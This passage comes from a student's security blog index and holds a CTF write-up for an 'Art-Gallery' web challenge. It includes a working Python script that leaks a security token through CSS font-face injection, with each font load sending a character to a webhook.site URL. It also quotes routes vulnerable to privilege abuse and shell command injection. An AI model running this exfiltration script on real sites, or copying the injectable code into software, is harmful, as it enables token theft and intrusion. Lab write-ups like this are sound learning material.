regions. Let\u0026rsquo;s get them now ! We will get a bunch of offset. *It will easier to read :v Then do the same steps to read into file /proc/self/mem with offset and length\nFINALLY ::: # You will find it \u0026lt;333 Art-Gallery # Overview # Main goals : We need to stole 2 types of token : SECURITY_TOKEN and SECRET_TOKEN. Use this to get access as admin and get the Flag stored at /admin SECRET_TOKEN : # This is really clear how to stole this.\napp.get(\u0026#39;/api/update\u0026#39;, auth, debug, csp, (req, res) =\u0026gt; { if (req.user.role === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; (req.ip === \u0026#39;::1\u0026#39; || req.ip === \u0026#34;127.0.0.1\u0026#34; || req.ip === \u0026#34;::ffff:127.0.0.1\u0026#34;)) { var username = req.query.username; // Grant developer role console.log(username, \u0026#34; is now a developer\u0026#34;); users.get(username).role = \u0026#39;developer\u0026#39;; } else { return res.status(403).send(\u0026#39;Forbidden\u0026#39;); } }); // Developer Zone app.get(\u0026#39;/api/dev\u0026#39;, auth, csp, debug, (req, res) =\u0026gt; { if (req.user.role === \u0026#39;developer\u0026#39; || req.user.role === \u0026#39;admin\u0026#39;) { return res.send(\u0026#39;JWT_SECRET: \u0026#39; + JWT_SECRET); } else { return res.status(403).send(\u0026#39;Forbidden\u0026#39;); } }); Well a users can get the SECRET_TOKEN with developer role is powered by the admin. But it actually just use the GET and we can abuse the function report to achive this goal. app.post(\u0026#39;/report\u0026#39;, auth, apiLimiter, async (req, res) =\u0026gt; { var url = req.body.url; if (!url) { return res.status(404).json({ message: \u0026#39;Not found\u0026#39; }); } if (!url.startsWith(\u0026#39;http://localhost:1337/view/\u0026#39;)) { return res.json({ success: false, message: \u0026#39;Nice try kiddo!\u0026#39; }); } console.log(\u0026#34;visiting url: \u0026#34;, url); try { visit(url); } catch (error) { console.log(error); } return res.json({ success: true, message: \u0026#39;Report sent successfully\u0026#39; }); }); Here is poc :\nTurn on debug with route /api/debug?debug_mode=1 Update role user with route /api/update?username=123 And stole it with with /api/dev(you will need to login again) Now we stole the the SECRET_KEY !!! How to steal the SECURITY_TOKEN : # Maybe you will think about the report function and lead the page to a XSS page and get the cookies. But it is not the case in this challenge because the cookies are protected. So how we leak the SECURITY_TOKEN. Read the source code you will see some malicous . app.use((req, res, next) =\u0026gt; { // Should be safe right? if (!req.theme) { const theme = req.query.theme; if (theme \u0026amp;\u0026amp; !theme.includes(\u0026#34;\u0026lt;\u0026#34;) \u0026amp;\u0026amp; !theme.includes(\u0026#34;\u0026gt;\u0026#34;)) { req.theme = theme; }else{ req.theme = \u0026#39;white\u0026#39;; } } next(); }) It creates a middleware to pass our query theme and put it into a style tag \u0026lt;style nonce=\u0026#34;{{ nonce }}\u0026#34;\u0026gt; body { background: {{theme | safe}}; } \u0026lt;/style\u0026gt; \u0026lt;h1 class=\u0026#34;title The safe makes it injectable. Let me show you an example. So we have a CSS injection ? And you can pay attention that the SECURITY_TOKEN is actually showed in the user interface? Well when learning XSS i found this good blog and I can even leak the SECURITY_TOKEN now !!!\nIdea # The leaks is working because of abusing the @font with loading an URL when matching a range of UNICODE which can just be a letter too ~~ !! Idea is create many fonts from a-z0-9 which one will fetch to my Webhook with its char and position . I have created a script to automate this. import time import requests import random import string from urllib.parse import quote s = requests.Session() def generate_random_string(length): # Choose from uppercase, lowercase, and digits characters = string.ascii_letters + string.digits random_string = \u0026#39;\u0026#39;.join(random.choices(characters, k=length)) return random_string baseUrl = r\u0026#34;http://localhost:1337\u0026#34; data = { \u0026#34;username\u0026#34;:generate_random_string(4), \u0026#34;password\u0026#34;:\u0026#34;123\u0026#34; } res = s.post(baseUrl+\u0026#34;/register\u0026#34;,json=data) print(res.text) res = s.post(baseUrl+\u0026#34;/login\u0026#34;,json=data) print(res.text) token = res.cookies.get(\u0026#39;token\u0026#39;) def char_to_unicode(char): code_point = ord(char) return f\u0026#34;{code_point:02X}\u0026#34; chars =\u0026#34;abcdefghijklmnopqrstuvwxyz0123456789\u0026#34; print(chars) webhook = \u0026#34;https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15\u0026#34; def loadFont(i): font = r\u0026#34;\u0026#34; result = [f\u0026#34;f{char}\u0026#34; for char in chars] result_string = r\u0026#39;, \u0026#39;.join(result) for char in chars: font+= r\u0026#39;\u0026#39;\u0026#39; @font-face%20{%20font-family:%20\u0026#34;f\u0026#39;\u0026#39;\u0026#39;+char+r\u0026#39;\u0026#39;\u0026#39;\u0026#34;;%20src:%20url(https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15/?q=\u0026#39;\u0026#39;\u0026#39;+char+str(i)+r\u0026#39;\u0026#39;\u0026#39;);%20unicode-range:%20U%2b\u0026#39;\u0026#39;\u0026#39;+char_to_unicode(char)+\u0026#39;\u0026#39;\u0026#39;;%20}\u0026#39;\u0026#39;\u0026#39; font+=r\u0026#39;\u0026#39;\u0026#39;.SECURITY_TOKEN%20:nth-child(\u0026#39;\u0026#39;\u0026#39;+str(i)+r\u0026#39;\u0026#39;\u0026#39;){color:red;font-family:\u0026#39;\u0026#39;\u0026#39;+result_string+r\u0026#39;\u0026#39;\u0026#39;,Arial\u0026#39;\u0026#39;\u0026#39; return font loadFont(1) def leak(i): data={\u0026#34;url\u0026#34;:baseUrl+r\u0026#39;\u0026#39;\u0026#39;/view/../profile?theme=white;:}\u0026#39;\u0026#39;\u0026#39;+loadFont(i)} res=s.post(baseUrl+\u0026#39;/report\u0026#39;,json=data,cookies={\u0026#34;token\u0026#34;:token}) print(res.text) for i in range(2,22): leak(i) FOUND local : ditmbzpvkkm7ow85qjz\nFOUND server: b3zjagxhqzwarjzfjkj\nThen just use JWT token and login as admin :DDD. Game end. \u0026lt;3 \u0026lt;3 \u0026lt;3 Conclusion. # I want to say thank you to all the authors who spends time creating such a great challenge. I learned a lots from these and its good chance to try my self to the best !!! ","date":"27 August 2024","externalUrl":null,"permalink":"/posts/wannagame/","section":"Posts","summary":"Write ups WannaGame # Dox List: # Source code : # CVE-2024-42352: https://nvd.nist.gov/vuln/detail/CVE-2024-42352\nServer :\n@app.route(\u0026#39;/health_check\u0026#39;) def health_check(): cmd = request.args.get(\u0026#39;cmd\u0026#39;) or \u0026#39;ping\u0026#39; health_check = f\u0026#39;echo \\\u0026#39;db.runCommand(\u0026#34;{cmd}\u0026#34;).ok\\\u0026#39; | mongosh mongodb:27017/app --quiet\u0026#39; try: result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2) app.logger.info(result) return \u0026#39;Database is responding\u0026#39; if \u0026#39;1\u0026#39; in result.stdout else \u0026#39;Database is not responding\u0026#39; except subprocess.TimeoutExpired: return \u0026#39;Database is not responding\u0026#39; @app.route(\u0026#39;/api/dogs\u0026#39;) def get_dogs(): app.logger.info(f\u0026#34;Requests Header : {request.headers}\u0026#34;) dogs = [] for dog in app_db[\u0026#39;doxlist\u0026#39;].","title":"WannaGame","type":"posts"},{"content":"Im just a student wanna learn to sec\nHere is the place I note my journey !\n","date":"13 June 2022","externalUrl":null,"permalink":"/about/","section":"hibwyli","summary":"Im just a student wanna learn to sec\nHere is the place I note my journey !","title":"About","type":"page"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]